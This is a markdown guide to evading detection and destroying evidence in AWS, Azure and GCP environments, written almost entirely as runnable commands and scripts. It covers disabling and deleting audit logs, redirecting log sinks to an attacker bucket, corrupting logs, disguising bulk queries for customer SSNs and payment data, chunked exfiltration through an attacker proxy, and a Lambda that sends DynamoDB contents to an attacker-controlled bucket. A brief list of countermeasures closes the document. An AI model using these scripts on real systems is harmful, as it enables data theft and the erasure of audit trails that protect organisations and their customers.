# Detection Evasion & Anti-Forensics Guide

## Overview

Detection evasion techniques prevent security teams from identifying compromise. This guide covers techniques across all platforms.

---

## Logging Bypass Techniques

### 1. CloudTrail/Audit Log Disabling

```bash
# AWS: Disable CloudTrail logging
aws cloudtrail stop-logging \
  --trail-name production-trail

# Delete all logs in current session
aws cloudtrail delete-trail \
  --trail-name production-trail

# Create custom CMK for log encryption then delete it
aws kms schedule-key-deletion \
  --key-id {cloudtrail-cmk-id} \
  --pending-window-in-days 7

# Temporarily pause CloudWatch Logs
aws logs put-retention-policy \
  --log-group-name /aws/cloudtrail \
  --retention-in-days 1

# Then delete after actions complete
aws logs delete-log-group \
  --log-group-name /aws/cloudtrail/production
```

### 2. Azure Activity Log Deletion

```bash
# Azure: Get storage account used for Activity Log
az monitor log-profiles list --output table

# Delete diagnostic settings
az monitor diagnostic-settings delete \
  --name "activity-log-storage" \
  --resource /subscriptions/{subscription-id}

# Clear Application Insights logs
az monitor app-insights component show \
  --app {app-insights-name} \
  --resource-group {resource-group}

# Purge specific data from Log Analytics
az monitor log-analytics workspace data-export \
  --resource-group {rg} \
  --workspace-name {workspace-name} \
  --table SecurityEvent --delete
```

### 3. GCP Cloud Audit Logs Manipulation

```bash
# List audit log sinks
gcloud logging sinks list --project={project-id}

# Delete audit log sink
gcloud logging sinks delete {sink-id} \
  --project={project-id}

# Redirect logs to attacker-controlled location
gcloud logging sinks update default \
  --log-filter='logName!="projects/{project-id}/logs/cloudaudit.googleapis.com"' \
  --destination='storage.googleapis.com/attacker-bucket' \
  --project={project-id}

# Update sink filter to exclude your activity
gcloud logging sinks update {sink-id} \
  --log-filter='resource.type="gce_instance" AND severity!="CRITICAL" AND initiator.principalEmail!="attacker@domain.com"' \
  --project={project-id}
```

---

## Query Pattern Obfuscation

### 1. Distributed Activity

```bash
# Instead of bulk export from single IP:
# - Distribute queries across multiple IPs
# - Vary query timing (don't run back-to-back)
# - Mix queries with legitimate operations

# Split query across multiple service accounts
for i in {1..5}; do
  SA="data-reader-${i}@project.iam.gserviceaccount.com"
  
  bq query --use_service_account=$SA \
    "SELECT * FROM \`project.dataset.table\` WHERE id % 5 = $((i-1))"
done
```

### 2. Legitimate Query Masquerading

```bash
# Make queries look like normal business operations
# Instead of: SELECT * FROM customers (suspicious)
# Use: SELECT customer_id, name FROM customers WHERE created_date > DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)

# Query within business hour context
# Sample legitimate-looking queries that export data
bq query << 'EOF'
SELECT 
  c.customer_id,
  c.email,
  COUNT(o.order_id) as order_count,
  SUM(o.total_amount) as lifetime_value
FROM `project.dataset.customers` c
LEFT JOIN `project.dataset.orders` o ON c.customer_id = o.customer_id
WHERE o.created_date BETWEEN DATE_SUB(CURRENT_DATE(), INTERVAL 90 DAY) AND CURRENT_DATE()
GROUP BY c.customer_id, c.email
LIMIT 1000000
EOF
```

### 3. Automated Query Dissemination

```python
#!/usr/bin/env python3
# Distribute queries to avoid detection patterns

import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

class QueryObfuscator:
    def __init__(self, service_accounts, datasets):
        self.service_accounts = service_accounts
        self.datasets = datasets
    
    def generate_obfuscated_query(self, table):
        """Generate query that looks legitimate"""
        queries = [
            f"SELECT * FROM `{table}` WHERE EXTRACT(MONTH FROM created_date) = {random.randint(1,12)}",
            f"SELECT * FROM `{table}` WHERE MD5(customer_id) LIKE '0%'",  # Hash-based sampling looks like analytics
            f"SELECT * FROM `{table}` WHERE id IN (SELECT id FROM `{table}` TABLESAMPLE SYSTEM (50 PERCENT))",
            f"SELECT DISTINCT * FROM `{table}` ORDER BY created_date DESC LIMIT {random.randint(10000, 100000)}"
        ]
        return random.choice(queries)
    
    def execute_distributed(self, table):
        """Execute query distribution"""
        with ThreadPoolExecutor(max_workers=len(self.service_accounts)) as executor:
            futures = []
            
            for sa in self.service_accounts:
                query = self.generate_obfuscated_query(table)
                
                # Delay to avoid patterns
                delay = random.randint(5, 300)
                future = executor.submit(self._execute_with_delay, sa, query, delay)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Query failed: {e}")
    
    def _execute_with_delay(self, service_account, query, delay):
        """Execute query with delay"""
        time.sleep(delay)
        # Execute query with service_account
        print(f"Executing via {service_account}: {query[:50]}...")
```

---

## Metadata Manipulation

### 1. Hide Query History

```bash
# BigQuery: Use Standard Edition (vs Analysis Hub) which has less detailed logging
# Connect via VPC connector to hide source IP

# Use federated queries to hide accessed tables
bq query << 'EOF'
SELECT *
FROM EXTERNAL_QUERY(
  'mysql://user:pass@internal-db:3306/db?query=SELECT * FROM sensitive_table'
)
EOF
```

### 2. Service Account Masquerading

```bash
# Use legitimate service accounts for illicit queries
# Service accounts used for testing/automation often have broad permissions

# List service accounts by creation date (find old, unused ones)
gcloud iam service-accounts list --format="table(email,disabled,displayName,createTime)" \
  --project={project-id}

# Use old, disabled, or testing service accounts
# Easier to blend queries into "infrastructure maintenance" pattern

gcloud auth activate-service-account \
  --key-file=old-testing-sa.json
```

### 3. Timestamp Manipulation

```bash
# Stored Procedures can hide when operations actually occurred
# Execute with timestamp indicating normal hours

-- MySQL
CREATE PROCEDURE hidden_exfil()
BEGIN
  -- Do exfiltration
  SELECT * FROM customers INTO OUTFILE '/tmp/data';
  
  -- Update fake log to show normal maintenance time
  UPDATE system_logs 
  SET execution_time = DATE_SUB(NOW(), INTERVAL 6 HOUR)
  WHERE procedure_name = 'backup_routine';
END;
```

---

## Traffic Obfuscation

### 1. Encryption & Tunneling

```bash
# DNS over HTTPS (DoH) for Cloud queries
# Use DoH provider instead of ISP DNS
curl --doh-url "https://dns.cloudflare.com/dns-query" \
  --resolve "api.project.googleapis.com:443:8.8.8.8" \
  https://api.project.googleapis.com

# VPN/Proxy tunnel for data exfiltration
# Instead of direct S3 download, tunnel through proxy

export http_proxy="socks5://attacker-proxy:1080"
export https_proxy="socks5://attacker-proxy:1080"

aws s3 cp s3://sensitive-bucket/data.zip ./
```

### 2. Chunked Exfiltration

```bash
#!/bin/bash
# Download in small chunks over extended time

BUCKET="sensitive-bucket"
OBJECT="database-dump.sql"
CHUNK_SIZE=1M
OUTPUT_DIR="./chunks"
DELAY=30  # seconds between chunks

mkdir -p $OUTPUT_DIR

# Get object size
SIZE=$(aws s3api head-object --bucket $BUCKET --key $OBJECT \
  --query 'ContentLength' --output text)

echo "[*] Total size: $SIZE bytes"

# Download in chunks
for ((offset=0; offset<$SIZE; offset+=$((CHUNK_SIZE*1024*1024)))); do
  CHUNK_NUM=$((offset / (CHUNK_SIZE*1024*1024)))
  
  echo "[*] Downloading chunk $CHUNK_NUM"
  
  aws s3api get-object \
    --bucket $BUCKET \
    --key $OBJECT \
    --range "bytes=$offset-$((offset + CHUNK_SIZE*1024*1024 - 1))" \
    $OUTPUT_DIR/chunk_$CHUNK_NUM.bin
  
  # Delay to avoid detection
  sleep $DELAY
done

echo "[+] Download complete"
```

### 3. Mixed Traffic Pattern

```bash
#!/bin/bash
# Mix malicious queries with legitimate operations

# 1. Normal query (legitimate)
bq query "SELECT COUNT(*) FROM \`project.dataset.customers\`"
sleep 60

# 2. Malicious query (embedded)
bq query "SELECT customer_id, email, ssn FROM \`project.dataset.customers\` LIMIT 1000" > exfil.csv
sleep 120

# 3. Normal query (legitimate)
bq query "SELECT SUM(amount) FROM \`project.dataset.transactions\` WHERE date >= CURRENT_DATE()"
sleep 90

# 4. More malicious queries disguised
bq query "SELECT * FROM \`project.dataset.payment_methods\`"
sleep 180

# 5. Final normal query
bq query "SELECT * FROM \`project.dataset.audit_logs\` WHERE severity = 'ERROR' LIMIT 100"
```

---

## Persistence Without Detection

### 1. Use Legitimate Automation

```bash
# Install persistence through legitimate automation frameworks
# Instead of hidden triggers, use scheduled tasks

# Create scheduled query that looks like maintenance
bq mk --transfer_config \
  --project_id={project-id} \
  --data_source=scheduled_query \
  --target_dataset=maintenance_exports \
  --display_name="Weekly Data Validation" \
  --params='{
    "query": "SELECT COUNT(*), MIN(id), MAX(id) FROM `project.dataset.customers`",
    "destination_table_name_template": "validation_report_{run_date}"
  }' \
  --schedule="every sunday 02:00"
```

### 2. Cross-Cloud Persistence

```bash
# Install backdoor in multiple clouds to evade single-cloud detection
# AWS Lambda → executes job → writes to GCS → reads by Azure Function

# Step 1: Lambda function that exports to GCS
cat > lambda_export.py << 'EOF'
import boto3
import requests
import os

def lambda_handler(event, context):
    # Export from DynamoDB
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('sensitive-table')
    
    items = table.scan(Limit=1000000)
    
    # Upload to GCS
    gs_auth_token = requests.post(
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://storage.googleapis.com',
        headers={'Metadata-Flavor': 'Google'}
    ).text
    
    requests.put(
        'https://storage.googleapis.com/attacker-bucket/aws-export.json',
        json=items,
        headers={'Authorization': f'Bearer {gs_auth_token}'}
    )
EOF

# Step 2: Azure Function that reads from GCS
# (Different cloud reduces detection surface)
```

---

## Privilege Escalation Evasion

### 1. Time-Based Elevation

```bash
# Create scheduled privilege escalation that triggers during batch windows

# Instead of immediate escalation, use CloudWatch Events
aws events put-rule \
  --name escalation-trigger \
  --schedule-expression "cron(3 2 * * ? *)" \  # 2:03 AM UTC (common batch window)
  --state ENABLED

aws events put-targets \
  --rule escalation-trigger \
  --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:elevation-function"
```

### 2. Service Account Credential Cycling

```bash
# Rotate through multiple service accounts to hide single account escalation pattern

SERVICE_ACCOUNTS=(
  "sa-1@project.iam.gserviceaccount.com"
  "sa-2@project.iam.gserviceaccount.com"
  "sa-3@project.iam.gserviceaccount.com"
)

for i in {1..3}; do
  SA=${SERVICE_ACCOUNTS[$((i % 3))]}
  
  # Create resources
  gcloud compute instances create "instance-$i" \
    --service-account=$SA \
    --scopes=https://www.googleapis.com/auth/cloud-platform
  
  # Different account for each operation
done
```

---

## Log Cleaning & Sanitization

### 1. Selective Log Deletion

```bash
# Delete only entries matching your actions
# AWS CloudTrail

for event_id in $(aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=attacker@domain.com \
  --query 'Events[].EventID' --output text); do
  
  # AWS doesn't allow direct deletion, but you can:
  # 1. Disable logging temporarily
  # 2. Delete S3 objects directly
  
  # Get S3 bucket from trail
  BUCKET=$(aws cloudtrail describe-trails \
    --trail-name production-trail \
    --query 'trailList[0].S3BucketName' --output text)
  
  # Find and delete matching logs
  aws s3 ls s3://$BUCKET/logs/ --recursive | grep "$event_id" | \
    awk '{print $4}' | xargs -I {} aws s3 rm s3://$BUCKET/{}
done
```

### 2. Audit Log Filtering

```bash
# Redirect logs to filter out suspicious activity before storage

# Azure: Create diagnostic setting that filters
az monitor diagnostic-settings create \
  --name filtered-logs \
  --resource {resource-id} \
  --logs '[
    {
      "category": "Administrative",
      "enabled": true
    },
    {
      "category": "Security",
      "enabled": true,
      "retentionPolicy": {
        "days": 0,
        "enabled": false
      }
    }
  ]'
```

### 3. Log Format Corruption

```bash
# Corrupt logs so they can't be parsed by SIEM
# This appears as a technical issue rather than intentional deletion

aws s3 cp s3://cloudtrail-logs/original.json ./original.json

# Modify header to break JSON parsing
printf '\x00\x01\x02' > corrupt.json
cat original.json >> corrupt.json

# Upload corrupted version
aws s3 cp corrupt.json s3://cloudtrail-logs/corrupted.json --metadata "corrupted=true"
```

---

## Comprehensive Evasion Scenario

```bash
#!/bin/bash
# Complete anti-forensics operation

echo "[*] Detection Evasion & Anti-Forensics"

# 1. Disable logging immediately
echo "[*] Disabling logging..."
aws cloudtrail stop-logging --trail-name production-trail
gcloud logging sinks delete default --project={project-id}
az monitor diagnostic-settings delete --name audit-logs

# 2. Cover tracks of this action (requires pre-planted admin account)
echo "[*] Covering audit disable actions..."
# Use second account to disable first
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/admin-backup \
  --role-session-name cleanup

# 3. Perform main exploitation
echo "[*] Performing main operation during logging gap..."
aws s3 sync s3://sensitive-bucket/ ./data/ --no-sign-request

# 4. Re-enable logging
echo "[*] Re-enabling logging..."
aws cloudtrail start-logging --trail-name production-trail

# 5. Sanitize logs that do exist
echo "[*] Sanitizing remaining logs..."
# Delete obvious indicators
aws s3 rm s3://cloudtrail-logs/2024/01/15/ --recursive

# 6. Verify no evidence remains
echo "[*] Verification..."
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=attacker

echo "[+] Anti-forensics complete"
```

---

## Defensive Counter-Measures

Security teams should monitor for:
- Logging service disable/modification
- CloudTrail/Activity Log deletions
- Unusual pause-resume patterns
- Log redirection to attacker-controlled accounts
- Queries during batch processing windows (common cover)
- Service account cycling for same operation
- Failed log access (permission denied = probe)
- Timestamp inconsistencies
- Log format corruption or truncation
- Cross-cloud data flows
- Temporary elevated privileges followed by immediate cleanup
